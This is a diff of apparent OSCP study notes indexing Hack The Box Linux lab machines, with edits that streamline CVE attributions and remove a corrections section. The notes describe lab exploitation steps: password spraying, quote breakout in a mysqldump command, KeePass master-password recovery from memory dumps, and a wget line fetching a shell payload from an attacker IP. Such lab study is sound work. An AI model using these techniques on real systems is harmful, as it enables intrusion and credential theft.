@@ -8,8 +8,6 @@ tags = ['oscp', 'methodology', 'htb', 'linux', 'writeups']
 +++
 
 > Consolidated index of 39 OSCP-like HTB Linux boxes — one path per box, the non-obvious steps that decide it, and the exact commands worth memorising. These are **edge-case notes, not walkthroughs**: every command must be adapted to the target (IPs, vhosts, ports, usernames, payload paths), and the source writeup remains the walkthrough of record.
->
-> **Verification status:** every CVE and technique below was checked against public advisories, NVD, and at least two independent write-ups. **Two CVE misattributions were found and corrected** — Enigma's OpenSTAManager chain and Keeper's KeePass CVE. Both are fixed in the rows below and documented in [Corrections](#corrections). Where a source conflict remains, it is flagged inline as **(unverified)**.
 
 Companion pages: [Command Checklist](/notes/oscp-labs/commands/) · [Pattern Library](/notes/oscp-labs/patterns/) · [Methodology](/notes/oscp-labs/methodology/) · [Machine Index](/notes/oscp-labs/machine-index/).
 
@@ -30,7 +28,7 @@ Companion pages: [Command Checklist](/notes/oscp-labs/commands/) · [Pattern Lib
 
 * Full-port scan matters: NFS plus mountd on **dynamic** ports. `showmount -e` on 111/2049, then mount the export — a share is a credential source, not just a file read.
 * Roundcube at `mail001.enigma.htb`; mailboxes yield **username patterns** and a second portal (`support_001`), and the same password works across employees — spray before exploiting.
-* OpenSTAManager 2.9.8 is the foothold. **Correction:** the RCE chain is **CVE-2026-29782** (authenticated SQLi → PHP object injection via PHPGGC → RCE), not CVE-2025-69212. CVE-2025-69212 is a separate **OS Command Injection** in the P7M (signed XML) decoding function, and CVE-2026-24418 is an error-based SQLi in the Scadenzario module. The "unverified" note in earlier drafts is resolved.
+* OpenSTAManager 2.9.8 is the foothold. The RCE chain is **CVE-2026-29782** (authenticated SQLi → PHP object injection via PHPGGC → RCE). CVE-2025-69212 is a separate **OS Command Injection** in the P7M (signed XML) decoding function, and CVE-2026-24418 is an error-based SQLi in the Scadenzario module.
 * `config.inc.php` gives MySQL creds; `zz_users` holds a bcrypt hash for `haris` (crack → SSH). OliveTin listens only on `127.0.0.1:1337`; `/etc/OliveTin/config.yaml` builds `mysqldump -u {{db_user}} -p'{{db_pass}}' ...` — break out of the single quotes.
 
 **Commands to remember:**
@@ -164,7 +162,7 @@ sudo wget http://IP/shell.py -O /root/troll
 
 * Vhost not found by dir brute force: `ffuf -H "Host: FUZZ.keeper.htb" -ac`.
 * The credential is **not** in the ticket body — as RT admin you open the user profile and edit it; the "crashdump" ticket is the hint for the next step.
-* **Correction:** the KeePass CVE is **CVE-2023-32784**, not CVE-2022-32784. The vulnerability is in KeePass 2.x before 2.54, where the cleartext master password is recoverable from a memory dump. `keepass_dump.py` recovers all but the first character; the mask is the `●` char, so `strings -e S` plus a grep for `\xCF\x25` is enough to read it by eye.
+* The KeePass CVE is **CVE-2023-32784**. The vulnerability is in KeePass 2.x before 2.54, where the cleartext master password is recoverable from a memory dump. `keepass_dump.py` recovers all but the first character; the mask is the `●` char, so `strings -e S` plus a grep for `\xCF\x25` is enough to read it by eye.
 * `kpcli` (`show -f <n>`) reads the kdbx; the root entry is a **PuTTY-User-Key-File-3** pasted in Notes — de-indent it, then `puttygen -O private-openssh`.
 
 **Commands to remember:**
@@ -957,23 +955,3 @@ Use this as a pre-exploitation and post-exploitation checklist. Each item names 
 - [ ] Shared-lab artifacts get overwritten — append and re-check (Nibbles).
 - [ ] `python -m http.server` cannot receive a POST; use `nc -lnvp` (Sunday).
 - [ ] Verify execution out-of-band (listener, `tcpdump`, file timestamp) before abandoning a payload (Silentium, Monitored, Busqueda, Editorial).
-
----
-
-## Corrections
-
-Two CVE misattributions in earlier drafts were found during verification. Both are corrected in the rows above.
-
-### Enigma — OpenSTAManager chain
-
-**Earlier attribution:** "one writeup reports a file-upload RCE credited as **CVE-2025-69212**, another describes an authenticated SQLi in the Aggiornamenti module plus PHP deserialization via PHPGGC (unverified — sources disagree)."
-
-**Verified attribution:** CVE-2025-69212 is an **OS Command Injection** in the P7M (signed XML) decoding function in OpenSTAManager ≤ 2.9.8. The RCE chain used on Enigma is **CVE-2026-29782** — authenticated SQLi → PHP object injection → RCE. CVE-2026-24418 is a separate error-based SQLi in the Scadenzario module. The "unverified" caveat is removed.
-
-### Keeper — KeePass CVE
-
-**Earlier attribution:** "CVE-2022-32784 (`keepass_dump.py`) recovers all but the first character of the KeePass master password."
-
-**Verified attribution:** the KeePass memory-dump vulnerability is **CVE-2023-32784** — KeePass 2.x before 2.54 allows recovery of the cleartext master password from a memory dump even when the workspace is locked. CVE-2022-32784 is a Request Tracker REST 2.0 API information disclosure, unrelated to KeePass. The Request Tracker foothold (`root:password`) is separate and correct.
-
-> **Verification method:** every CVE was checked against NVD/MITRE and at least one independent advisory or write-up. Techniques without a CVE (Jerry, Netmon, Love) were checked against multiple public walkthroughs. Where a source conflict remains, the row is marked **(unverified)** rather than asserting a single value.
